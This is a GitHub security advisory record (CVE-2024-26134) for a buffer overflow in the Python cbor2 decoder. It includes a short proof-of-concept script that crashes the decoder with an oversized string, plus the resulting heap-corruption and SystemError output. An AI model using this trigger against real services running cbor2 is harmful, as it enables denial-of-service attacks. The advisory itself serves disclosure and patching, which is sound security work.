{
    "ghsaId": "GHSA-375g-39jq-vq7m",
    "severity": "HIGH",
    "summary": "Potential buffer overflow in CBOR2 decoder",
    "description": "### Summary\nEver since https://github.com/agronholm/cbor2/pull/204 (or specifically https://github.com/agronholm/cbor2/commit/387755eacf0be35591a478d3c67fe10618a6d542) was merged, I can create a reproducible crash when running the snippet under PoC on a current Debian bullseye aarm64 on a Raspberry Pi 3 (I was **not** able to reproduce this on my x86_64 Laptop with Python 3.11; I suspect because there is enough memory to allocate still)\n\n## Details\n\n\n### PoC\n```py\nimport json\nimport concurrent.futures\nimport cbor2\n\ndef test():\n    obj = \"x\" * 131128\n    cbor_enc = cbor2.dumps(obj)\n    return cbor2.loads(cbor_enc)\n\nwith concurrent.futures.ProcessPoolExecutor() as executor:\n    future = executor.submit(test)\n    print(future.result())\n```\n\n```\nmalloc(): unsorted double linked list corrupted\nTraceback (most recent call last):\n  File \"test.py\", line 14, in <module>\n    print(future.result())\n  File \"/usr/lib/python3.9/concurrent/futures/_base.py\", line 440, in result\n    return self.__get_result()\n  File \"/usr/lib/python3.9/concurrent/futures/_base.py\", line 389, in __get_result\n    raise self._exception\nconcurrent.futures.process.BrokenProcessPool: A process in the process pool was terminated abruptly while the future was running or pending.\n```\n\nIf one calls it without the indirection via the pool executor, a SystemError is shown that hides the buffer overflow.\n\n```py\nimport json\nimport cbor2\n\ndef test():\n    obj = \"x\" * 131128\n    cbor_enc = cbor2.dumps(obj)\n    return cbor2.loads(cbor_enc)\n\nprint(test())\n```\n\n```\nTraceback (most recent call last):\n  File \"test.py\", line 12, in <module>\n    print(test())\n  File \"test.py\", line 9, in test\n    return cbor2.loads(cbor_enc)\nSystemError: <built-in function loads> returned NULL without setting an error\n```\n\n### Impact\nAn attacker can crash a service using cbor2 to parse a CBOR binary by sending a long enough object.",
    "permalink": "https://github.com/advisories/GHSA-375g-39jq-vq7m",
    "publishedAt": "2024-02-21T00:09:03Z",
    "withdrawnAt": null,
    "identifiers": [
        {
            "type": "GHSA",
            "value": "GHSA-375g-39jq-vq7m"
        },
        {
            "type": "CVE",
            "value": "CVE-2024-26134"
        }
    ]
}